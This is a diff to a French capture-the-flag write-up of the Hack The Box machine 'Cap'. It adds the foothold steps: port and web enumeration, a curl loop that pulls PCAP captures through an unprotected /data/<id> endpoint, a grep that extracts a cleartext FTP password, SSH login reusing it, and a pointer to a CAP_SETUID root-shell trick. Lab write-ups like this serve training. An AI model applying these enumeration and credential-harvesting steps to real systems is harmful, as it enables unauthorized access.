@@ -403,22 +403,320 @@ Port 80 (http)
 
 ---
 
-## Exploitation – Prise pied (Foothold)
+## Exploitation – Prise de pied (Foothold)
 
-- Vecteur d'entrée confirmé (faille, creds, LFI/RFI, upload…).
-- Payloads utilisés (extraits pertinents).
-- Stabilisation du shell (pty, rlwrap, tmux…), preuve d'accès (`id`, `whoami`, `hostname`).
+La phase d’exploitation s’appuie sur les résultats fournis par `mon-nmap`, `mon-recoweb` et `mon-subdomains`, qui te permettent de cibler précisément les points d’entrée exposés.
+
+------
+
+### Résultats réseau (mon-nmap)
+
+Le scan TCP complet met en évidence une surface d’attaque **très limitée**, avec seulement trois services accessibles :
+
+- **21/tcp – FTP (vsftpd 3.0.3)**
+- **22/tcp – SSH (OpenSSH 8.2p1)**
+- **80/tcp – HTTP (Gunicorn)**
+
+Aucun autre port TCP n’est exposé.  
+Le scan UDP rapide ne révèle **aucun service exploitable directement**, les ports détectés étant majoritairement en état *open|filtered*.
+
+Les scans orientés vulnérabilités et CMS ne mettent en évidence **aucune faille connue** ni CMS classique.  
+À ce stade, tu constates que le service web correspond à une **application custom**, servie par Gunicorn.
+
+------
+
+### Résultats de l’énumération web (mon-recoweb)
+
+L’énumération des chemins web révèle un nombre **très restreint d’endpoints accessibles**, ce qui confirme une application volontairement minimaliste.
+
+Les chemins suivants sont identifiés :
+
+- **200 OK** :
+  - `/ip`
+  - `/netstat`
+- **302 Redirect** :
+  - `/data/`
+  - `/capture/`
+
+Les codes **302** indiquent que ces chemins existent côté serveur et sont activement gérés par l’application.  
+Tu observes également que les endpoints retournant **200 OK** exposent du contenu dynamique, accessible sans authentification.
+
+------
+
+### Résultats vhosts (mon-subdomains)
+
+Le scan des sous-domaines ne révèle **aucun vhost exploitable**.  
+Les réponses HTTP étant strictement identiques quel que soit l’en-tête `Host`, tu peux écarter la piste du vhost-fuzzing dans ce contexte.
+
+------
+
+### Bilan de l’énumération
+
+- La surface d’attaque réseau est **très restreinte**.
+- Aucun service ne présente de vulnérabilité évidente ou exploitable directement.
+- Le service **HTTP** est le seul à exposer des fonctionnalités accessibles sans prérequis d’authentification.
+- L’application web présente **quelques endpoints précis**, clairement identifiés lors de l’énumération, avec notamment les chemins **`/data/`** et **`/capture/`**, qui méritent une attention particulière.
+
+**À ce stade, la surface d’attaque de l’application est clairement délimitée.**
+
+### Premières observations via l’interface web
+
+Avant d’approfondir l’analyse par des scans automatisés, tu prends le temps de **tester manuellement l’interface web** exposée par l’application afin d’en comprendre le fonctionnement réel.
+
+L’exploration de l’interface se concentre sur les menus réellement exploitables :
+
+- Le menu **IP Configuration** affiche correctement les informations réseau, mais reste **purement informatif**, sans interaction possible.
+- Le menu **Network Status** présente également des données visibles, sans permettre d’action côté utilisateur.
+- Le menu **Security Snapshot (5 Second PCAP + Analysis)** déclenche une action côté serveur.
+
+Après génération de l’instantané de sécurité, l’application **affiche une page** de la forme :
+
+```
+http://cap.htb/data/<id>
+```
+
+Cette page présente les **résultats de l’analyse** et inclut un **bouton \*Download\***.
+ En cliquant sur ce bouton, il est possible de **télécharger la capture réseau correspondante** sous la forme du fichier :
+
+```
+<id>.pcap
+```
+
+### Analyse des endpoints identifiés
+
+Ces observations orientent l’analyse vers les endpoints **`/capture/`** et surtout **`/data/`**, utilisé par l’application pour exposer les captures réseau.
+
+> Les scans **ffuf** ne sont pas discriminants ici (réponses homogènes et très volumineuses), d’où l’utilisation de `mon-recoweb` avec `--no-ffuf-dirs --no-ffuf-files` et la conservation de **dirb** uniquement.
+
+
+
+#### Analyse de /capture/
+
+```bash
+mon-recoweb cap.htb/capture/ --no-ffuf-dirs --no-ffuf-files
+```
+
+```bash
+===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
+Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
+Script              : mon-recoweb v2.1.0
+
+Cible        : cap.htb
+Périmètre    : /capture/
+Date début   : 2026-01-29 16:36:09
+
+Commandes exécutées (exactes) :
+
+[dirb — découverte initiale]
+dirb http://cap.htb/capture/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/capture/dirb.log
+
+[ffuf — énumération des répertoires]
+(ffuf dirs skipped --no-ffuf-dirs)
+
+[ffuf — énumération des fichiers]
+(ffuf files skipped --no-ffuf-files)
+
+
+=== Résultat global (agrégé) ===
+
+
+=== Détails par outil ===
+
+[DIRB]
+
+[FFUF — DIRECTORIES]
+(aucun résultat)
+
+[FFUF — FILES]
+(aucun résultat)
+
+[OK] Done.
+```
+
+Les résultats montrent clairement que l'endpoint **`/capture/`** n’expose aucune ressource exploitable ; cette piste peut donc être écartée.
+
+#### Analyse de /data/
+
+```bash
+mon-recoweb cap.htb/data/ --no-ffuf-dirs --no-ffuf-files
+```
+
+```bash
+
+  ===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
+  Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
+  Script              : mon-recoweb v2.1.0
+  
+  Cible        : cap.htb
+  Périmètre    : /data/
+  Date début   : 2026-01-29 16:35:54
+  
+  Commandes exécutées (exactes) :
+  
+  [dirb — découverte initiale]
+  dirb http://cap.htb/data/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/data/dirb.log
+  
+  [ffuf — énumération des répertoires]
+  (ffuf dirs skipped --no-ffuf-dirs)
+  
+  [ffuf — énumération des fichiers]
+  (ffuf files skipped --no-ffuf-files)
+  
+  
+  === Résultat global (agrégé) ===
+  
+  http://cap.htb/data/00 (CODE:200|SIZE:17147)
+  http://cap.htb/data/01 (CODE:200|SIZE:17144)
+  http://cap.htb/data/02 (CODE:200|SIZE:17144)
+  http://cap.htb/data/03 (CODE:200|SIZE:17144)
+  http://cap.htb/data/0 (CODE:200|SIZE:17147)
+  http://cap.htb/data/1 (CODE:200|SIZE:17144)
+  http://cap.htb/data/2 (CODE:200|SIZE:17144)
+  http://cap.htb/data/3 (CODE:200|SIZE:17144)
+  
+  === Détails par outil ===
+  
+  [DIRB]
+  http://cap.htb/data/00 (CODE:200|SIZE:17147)
+  http://cap.htb/data/01 (CODE:200|SIZE:17144)
+  http://cap.htb/data/02 (CODE:200|SIZE:17144)
+  http://cap.htb/data/03 (CODE:200|SIZE:17144)
+  http://cap.htb/data/0 (CODE:200|SIZE:17147)
+  http://cap.htb/data/1 (CODE:200|SIZE:17144)
+  http://cap.htb/data/2 (CODE:200|SIZE:17144)
+  http://cap.htb/data/3 (CODE:200|SIZE:17144)
+  
+  [FFUF — DIRECTORIES]
+  (aucun résultat)
+  
+  [FFUF — FILES]
+  (aucun résultat)
+
+[OK] Done.
+
+```
+
+Le scan de `/data/` confirme le mécanisme déjà observé via l’interface web.  
+La présence inattendue de **`/data/0`** et **`/data/00`** suggère qu’une capture **`0.pcap`** existait déjà avant nos essais manuels.
+
+### Téléchargement en batch des PCAP
+
+Plutôt que de passer par l’interface web, tu peux télécharger directement les fichiers **PCAP** exposés en ligne de commande.
+
+```bash
+mkdir -p pcaps
+
+for i in $(seq 0 50); do
+  data_url="http://cap.htb/data/$i"
+  dl_url="http://cap.htb/download/$i"
+  out="pcaps/${i}.pcap"
+
+  # Tester l'existence logique de /data/<id>
+  if curl -s -o /dev/null -w "%{http_code}" "$data_url" | grep -q "^200$"; then
+    # Télécharger uniquement si /data/<id> existe
+    if curl -sL -f -o "$out" "$dl_url"; then
+      echo "[+] /data/$i -> downloaded $out"
+    else
+      rm -f "$out"
+    fi
+  fi
+done
+
+
+```
+
+voici ce que tu obtiens :
+
+```bash
+[+] /data/0 -> downloaded pcaps/0.pcap
+[+] /data/1 -> downloaded pcaps/1.pcap
+[+] /data/2 -> downloaded pcaps/2.pcap
+[+] /data/3 -> downloaded pcaps/3.pcap
+
+ls -l pcaps/    
+total 24
+-rw-r--r-- 1 kali kali 9935 Jan 29 16:48 0.pcap
+-rw-r--r-- 1 kali kali   24 Jan 29 16:48 1.pcap
+-rw-r--r-- 1 kali kali   24 Jan 29 16:48 2.pcap
+-rw-r--r-- 1 kali kali   24 Jan 29 16:48 3.pcap
+
+```
+
+Contrairement à **`0.pcap`**, les fichiers **`1.pcap`**, **`2.pcap`** et **`3.pcap`** ne contiennent que **24 bytes**, ce qui indique qu’ils ne correspondent pas à de véritables captures réseau.
+ L’analyse se concentre donc sur **`0.pcap`**.
+
+### Analyse de 0.pcap
+
+Pour analyser la capture **`0.pcap`**, il n’est pas nécessaire de lancer **Wireshark**, qui peut s’avérer lourd et inutilement complexe dans ce contexte.
+
+Une approche beaucoup plus simple consiste à extraire directement les chaînes lisibles du fichier et à filtrer les termes liés à l’authentification :
+
+```bash
+strings 0.pcap | grep -iE "user|pass|password|login|auth|credential|creds"
+```
+
+tu obtiens alors :
+
+```bash
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
+.form-signin input[type="password"] {
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
+USER nathan
+331 Please specify the password.
+PASS Buck3tH4TF0RM3!
+230 Login successful.
+```
+
+Ces lignes correspondent à une **séquence d’authentification FTP en clair**, capturée dans le trafic réseau.
+ Elles révèlent directement un **couple identifiant / mot de passe valide**, transmis sans chiffrement.
+
+```bash
+nathan:Buck3tH4TF0RM3!
+```
+
+Dans un contexte **CTF**, tu as toujours intérêt à tester ce type d’identifiants sur les autres services exposés.
+ Il est en effet fréquent que des credentials récupérés via un service (FTP, web, base de données) soient **réutilisés pour un accès distant**, notamment via **SSH**.
+
+### connexion SSH
+
+```bash
+ssh nathan@cap.htb  
+```
+
+Une fois connecté, tu confirmes rapidement l’accès en listant le contenu du répertoire personnel :
+
+```bash
+nathan@cap:~$ ls -l
+total 4
+-r-------- 1 nathan nathan 33 Jan 29 14:34 user.txt
+```
+
+### user.txt
+
+Le fichier **`user.txt`** est accessible et peut être lu immédiatement :
+
+```bash
+nathan@cap:~$ cat user.txt
+70e3xxxxxxxxxxxxxxxxxxxxxxxx4cdd
+```
+
+Ce premier accès valide marque la réussite de la **prise de pied (foothold)** sur la machine.
 
 ---
 
 ## Escalade de privilèges
 
-Une fois connecté en SSH en tant que `jkr`, tu appliques la méthodologie décrite dans la recette
+Une fois connecté en SSH en tant que `nathan`, tu appliques la méthodologie décrite dans la recette
    {{< recette "privilege-escalation-linux" >}}.
 
 ### Sudo -l
 
 La première étape consiste toujours à vérifier les droits `sudo` :
+
+
+
+![Extrait de GTFOBins expliquant comment exploiter la capability CAP_SETUID avec Python pour obtenir un shell root](extrait-de-GTFOBins-org-montrant-CAP_SETUID-shell-avec-python.png)
 
 
 ---
